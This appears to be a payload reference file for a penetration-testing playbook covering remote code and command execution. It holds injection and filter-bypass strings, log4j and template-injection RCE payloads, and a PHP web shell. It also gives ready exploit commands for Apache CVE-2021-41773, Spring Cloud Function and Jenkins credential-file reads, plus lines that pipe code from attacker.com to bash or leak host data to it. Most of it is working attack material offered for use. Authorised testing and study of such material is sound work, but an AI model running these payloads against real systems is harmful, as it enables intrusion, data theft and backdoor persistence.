# Payloads — Remote Code / Command Execution

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Curated payload bank (from the HackerOne corpus)

### Shell metacharacters

```text
;id
|id
||id
&id
&&id
$(id)
`id`
%0aid
%0d%0aid
';id;'
";id;"
|whoami
;cat /etc/passwd
$(cat /etc/passwd)
`cat /etc/passwd`
```

### Space / filter bypass

```text
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
c\at /etc/passwd
c'a't /etc/passwd
/bin/cat$IFS/etc/passwd
$(printf '\x69\x64')
echo${IFS}aWQ=|base64${IFS}-d|sh
id%09
id%0a
;id;#
|id|
```

### Argument injection

```text
--output=/tmp/x
-o /tmp/x
--config=/tmp/x
--upload-pack=id
--checkpoint-action=exec=id
-fsSL http://callback/x
--proxy=http://callback:8080
--dump-config
@file
file:///etc/passwd
```

### Expression / template / log4j

```text
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${jndi:ldap://callback/a}
${jndi:dns://callback/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}
{{cycler.__init__.__globals__.os.popen('id').read()}}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<%= system('id') %>
```

### Upload / parser / archive

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://callback/x)'
pop graphic-context
<?php system($_GET['c']); ?>
<svg onload=alert(1)>
../../../../var/www/html/shell.php
..\..\..\..\inetpub\wwwroot\shell.aspx
PK../../../../var/www/html/shell.php
```

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# RCE — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Shell -> `;id`, `|id`, `$(id)`, backticks, `%0aid`, newline injection

- Argument -> `--output=/tmp/x`, `-o`, `--config`, `file://`

- Expression -> `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`

- Log4j -> `${jndi:ldap://callback/a}`

- ImageMagick -> `push graphic-context` / `fill 'url(https://callback/x)'`



## Payload bank



**53 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Shell metacharacters



```text

;id

|id

||id

&id

&&id

$(id)

`id`

%0aid

%0d%0aid

';id;'

";id;"

|whoami

;cat /etc/passwd

$(cat /etc/passwd)

`cat /etc/passwd`

```



### Space / filter bypass



```text

cat${IFS}/etc/passwd

cat$IFS/etc/passwd

cat</etc/passwd

c\at /etc/passwd

c'a't /etc/passwd

/bin/cat$IFS/etc/passwd

$(printf '\x69\x64')

echo${IFS}aWQ=|base64${IFS}-d|sh

id%09

id%0a

;id;#

|id|

```



### Argument injection



```text

--output=/tmp/x

-o /tmp/x

--config=/tmp/x

--upload-pack=id

--checkpoint-action=exec=id

-fsSL http://callback/x

--proxy=http://callback:8080

--dump-config

@file

file:///etc/passwd

```



### Expression / template / log4j



```text

${7*7}

{{7*7}}

#{7*7}

<%= 7*7 %>

${jndi:ldap://callback/a}

${jndi:dns://callback/a}

${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}

{{cycler.__init__.__globals__.os.popen('id').read()}}

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<%= system('id') %>

```



### Upload / parser / archive



```text

push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://callback/x)'\npop graphic-context

<?php system($_GET['c']); ?>

<svg onload=alert(1)>

../../../../var/www/html/shell.php

..\..\..\..\inetpub\wwwroot\shell.aspx

PK../../../../var/www/html/shell.php

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` (53)

- `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` (12 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 7× | `$where` |

| 5× | `SFORMAT()` |

| 4× | `https://twitter.com/{username}/moments` |

| 4× | `<img>` |

| 4× | `..;/` |

| 4× | `requestOCSP()` |

| 4× | `loadSession()` |

| 4× | `VM.doCODESIZE()` |

| 4× | `discover()` |

| 4× | `%00` |

| 3× | `eval()` |

| 3× | `OsCommand.writeJson()` |

| 3× | `$templates` |

| 3× | `<local_file_path>` |

| 3× | `<webview>` |

| 3× | `loadSNI()` |

| 3× | `<div>` |

| 3× | `$GITHUB_TOKEN` |

| 3× | `install_packages()` |

| 3× | `=cmd\\|' /C calc'!A0` |



## Parameters observed



`for[]` · `id` · `name` · `for` · `iclLayout` · `url` · `debug` · `action` · `email` · `status` · `new_size[]` · `scope` · `dag_id` · `username` · `password` · `search` · `ref` · `client_id` · `redirect_uri` · `response_type`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_rce.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_rce.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` | 53 |

| `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` | 12 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_rce.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_rce.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_rce.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Use OAST for blind command injection; check argument injection in tools that shell out.



```sh

nuclei -u https://target -tags rce,cmdi,oast \

       -severity low,medium,high,critical -rl 40 -o nuclei_rce.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/cmdi -dast \

       -rl 40 -o nuclei_rce_cmdi.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/header-command-injection.yaml \

       -rl 40 -o nuclei_rce_header-command-injection.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Template Injection Probes

```

# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity

{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}

{{'7'*7}}

{{config}}

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}



# Nomad template injection (Go text/template)

{{ env "NOMAD_SECRET_ID" }}

{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}

{{ runscript "id" }}

```



### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)



Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:



- Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only

- Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution



**Version fingerprint:**

```bash

curl -sI http://target/ | grep -i "Server:"

# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)

# Patched:    Apache/2.4.51+

```



**File-read test (any alias):**

```bash

curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# Note: --path-as-is is REQUIRED — curl normalizes %2e by default

```



**RCE test (cgi-enabled alias only):**

```bash

curl --path-as-is -X POST \

  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \

  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

```



**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.



### Spring Cloud Function SpEL injection (CVE-2022-22963)



Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.



**Detection:**

- Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200

- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`

- Version banner via `/actuator/info` or response headers



**Exploit:**

```bash

curl -X POST http://target:8080/functionRouter \

  -H "Content-Type: text/plain" \

  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \

  --data "x"

```



The `new String[]{"...", "..."}` array form avoids shell-quoting issues that break the more common `.exec("id")` form when the SpEL header contains parentheses or quotes.



**Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).



### SnakeYAML RCE Gadget

```yaml

!!javax.script.ScriptEngineManager [

  !!java.net.URLClassLoader [[

    !!java.net.URL ["http://attacker.com/exploit.jar"]

  ]]

]

```



### Ruby YAML / rdoc_options RCE

```yaml

--- !ruby/object:Gem::Installer

i: x

```



### Dependency Confusion Detection

```bash

# Find internal package names

grep -r '"name"' node_modules/ | grep '@internal\|@company\|@private'

# Check if public registry has higher version

npm view @target-company/internal-package version 2>/dev/null

```



### Ingress-nginx Path Injection

```

# In spec.rules.http.paths.path

/something)(;.*);#

# Results in nginx config injection

```



### Kubernetes Exposed API Check

```bash

curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \

  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces

```



### Out-of-Band RCE Confirmation

```bash

# Payload to confirm blind RCE via DNS

curl "http://$(id | base64).YOUR-INTERACTSH-URL/"

nslookup $(whoami).attacker.com

wget http://attacker.com/$(cat /etc/hostname)

```



### ActiveStorage Path Traversal → RCE

```

# Filename in upload request

filename="../../../../etc/cron.d/backdoor"

# Cron payload content

* * * * * root curl http://attacker.com/shell | bash

```



### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)



Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).



**Detection:**

- Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)

- Or: any Java app whose CLI source uses args4j without `expandAtFiles=false`



**Test (Jenkins):**

```bash

# Get the legit CLI jar from the target

curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar



# First line of file leaks via 'help' error

java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd

# → ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash



# Full file leaks via 'connect-node' (every line returned as a "no such agent" error)

java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd

# → All passwd lines echoed back



# Recon: env vars + JENKINS_HOME path

java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ

```



**Crown-jewel files after JENKINS_HOME confirmed:**

- `/var/jenkins_home/secret.key` — master encryption key for stored credentials

- `/var/jenkins_home/secrets/master.key` — derives the encryption key

- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)

- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)

- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens



**Pattern generalizes beyond Jenkins.** Any Java service that:

1. Embeds args4j (most enterprise Java CLIs since 2010s)

2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)

3. Returns argument-parsing errors verbatim to the client



→ same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.



### Grep Patterns for Source Review

```bash

# Command injection sinks

grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .

grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .



# Template engine instantiation

grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .



# Unsafe YAML load

grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument

grep -rn "Yaml()\|new Yaml()" --include="*.java" .

```



---
